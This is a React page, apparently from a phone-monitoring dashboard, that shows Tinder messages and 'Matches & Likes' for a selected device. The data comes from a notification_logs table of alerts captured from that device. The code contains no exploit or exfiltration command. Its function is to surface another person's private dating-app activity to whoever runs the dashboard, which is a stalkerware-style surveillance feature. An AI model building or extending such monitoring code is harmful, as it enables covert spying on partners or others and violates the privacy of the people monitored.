"use client"

import { useState, useEffect, useCallback } from "react"
import { format, parseISO, isValid } from "date-fns"
import { MessageCircle, HeartPulse, AlertCircle, Flame } from "lucide-react"
import { DateRange } from "react-day-picker"

import { SocialChatPage } from "@/components/dashboard/social-chat-page"
import { DateRangeFilter } from "@/components/shared/date-range-filter"
import { PageHeader } from "@/components/shared/page-header"
import { Card } from "@/components/ui/card"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Skeleton } from "@/components/ui/skeleton"
import { useDeviceStore } from "@/lib/stores/device-store"
import { createClient } from "@/lib/supabase/client"

interface NotificationLog {
  id: string
  device_id: string
  title: string | null
  content: string | null
  big_text: string | null
  timestamp: string
}

const TINDER_PACKAGES = ["com.tinder"]

export default function TinderPage() {
  const { selectedDeviceId } = useDeviceStore()
  const [matches, setMatches] = useState<NotificationLog[]>([])
  const [isLoading, setIsLoading] = useState(false)
  const [dateRange, setDateRange] = useState<DateRange | undefined>()

  const fetchMatches = useCallback(async () => {
    if (!selectedDeviceId) return
    setIsLoading(true)
    const supabase = createClient()
    
    // Attempt to extract "Matches" from notification logs based on Tinder's usual notification text
    let query = supabase
      .from("notification_logs")
      .select("id, device_id, title, content, big_text, timestamp")
      .eq("device_id", selectedDeviceId)
      .in("package_name", TINDER_PACKAGES)
      .or('title.ilike.%match%,content.ilike.%match%,title.ilike.%liked%,content.ilike.%liked%')
      .order("timestamp", { ascending: false })
      .limit(50)

    if (dateRange?.from) query = query.gte("timestamp", dateRange.from.toISOString())
    if (dateRange?.to) query = query.lte("timestamp", dateRange.to.toISOString())

    const { data } = await query
    if (data) setMatches(data as NotificationLog[])
    setIsLoading(false)
  }, [selectedDeviceId, dateRange])

  useEffect(() => { fetchMatches() }, [fetchMatches])

  if (!selectedDeviceId) {
    return (
      <div className="p-8 pb-20 animate-in fade-in">
        <PageHeader title="🔥 Tinder" />
        <Card className="flex flex-col items-center justify-center p-12 text-center border-dashed border-2">
          <AlertCircle className="h-10 w-10 text-amber-500 mb-4" />
          <h3 className="text-lg font-semibold mb-2">No Device Selected</h3>
          <p className="text-slate-500 max-w-sm">Select a device to view Tinder activity and matches.</p>
        </Card>
      </div>
    )
  }

  return (
    <div className="space-y-4 animate-in fade-in pb-20">
      <Tabs defaultValue="messages">
        <div className="flex items-center justify-between mb-2">
          <TabsList className="h-9">
            <TabsTrigger value="messages" className="text-xs gap-1.5">
              <MessageCircle className="h-3.5 w-3.5" /> Messages
            </TabsTrigger>
            <TabsTrigger value="matches" className="text-xs gap-1.5 text-rose-500 data-[state=active]:text-rose-600">
              <HeartPulse className="h-3.5 w-3.5" /> Match Activity
            </TabsTrigger>
          </TabsList>
        </div>

        {/* Tab 1: Direct Messages */}
        <TabsContent value="messages" className="mt-0">
          <SocialChatPage
            platform="tinder"
            platformName="Tinder"
            platformIcon="🔥"
            platformColor="#FE3C72"
          />
        </TabsContent>

        {/* Tab 2: Matches extracted dynamically */}
        <TabsContent value="matches" className="mt-0 space-y-4">
          <PageHeader
            title="🔥 Tinder Matches & Likes"
            description="Match notifications captured from Tinder."
            actions={<DateRangeFilter date={dateRange} setDate={setDateRange} />}
          />
          
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
            {isLoading ? (
              Array.from({ length: 8 }).map((_, i) => (
                <Card key={i} className="p-4 space-y-3">
                  <div className="flex items-center gap-3">
                    <Skeleton className="h-12 w-12 rounded-full" />
                    <div className="space-y-2 flex-1">
                      <Skeleton className="h-4 w-3/4" />
                      <Skeleton className="h-3 w-1/2" />
                    </div>
                  </div>
                </Card>
              ))
            ) : matches.length === 0 ? (
              <Card className="col-span-full py-16 flex flex-col items-center justify-center text-slate-400 border-dashed">
                <Flame className="h-12 w-12 mb-3 opacity-30 text-rose-500" />
                <p>No match notifications found for this period.</p>
              </Card>
            ) : (
              matches.map((match) => {
                const isMatch = match.title?.toLowerCase().includes("match") || match.content?.toLowerCase().includes("match")
                return (
                  <Card key={match.id} className="p-4 hover:shadow-md transition-shadow relative overflow-hidden group border-rose-100 dark:border-rose-900/50">
                    <div className={`absolute top-0 right-0 h-1.5 w-full ${isMatch ? "bg-rose-500" : "bg-pink-400"}`} />
                    
                    <div className="flex items-start gap-3 mt-1">
                      <div className={`flex items-center justify-center h-12 w-12 rounded-full text-white font-bold text-lg shrink-0 ${isMatch ? "bg-gradient-to-tr from-rose-500 to-rose-400" : "bg-gradient-to-tr from-pink-500 to-pink-400"}`}>
                        {match.title ? match.title.charAt(0).toUpperCase() : "T"}
                      </div>
                      
                      <div className="flex-1 min-w-0">
                        <h4 className="font-semibold text-slate-900 dark:text-slate-100 truncate text-sm">
                          {match.title || "Tinder Notification"}
                        </h4>
                        <p className="text-xs text-slate-500 mt-0.5 line-clamp-2">
                          {match.big_text || match.content || "Activity logged."}
                        </p>
                        
                        <div className="text-[10px] text-slate-400 mt-2 font-medium">
                          {isValid(parseISO(match.timestamp)) ? format(parseISO(match.timestamp), "MMM d, yyyy 'at' h:mm a") : ""}
                        </div>
                      </div>
                    </div>
                  </Card>
                )
              })
            )}
          </div>
        </TabsContent>
      </Tabs>
    </div>
  )
}
